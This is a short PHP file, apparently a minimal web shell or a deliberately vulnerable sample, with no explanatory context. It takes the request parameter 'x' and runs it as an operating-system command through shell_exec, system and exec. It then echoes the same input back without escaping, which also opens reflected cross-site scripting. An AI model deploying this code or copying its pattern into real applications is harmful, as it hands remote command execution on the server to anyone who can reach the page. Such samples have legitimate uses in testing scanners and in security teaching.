<?php

  $x = $_REQUEST['x'];

  shell_exec($x);
  system($x);
  exec($x);
  echo $x;

?>
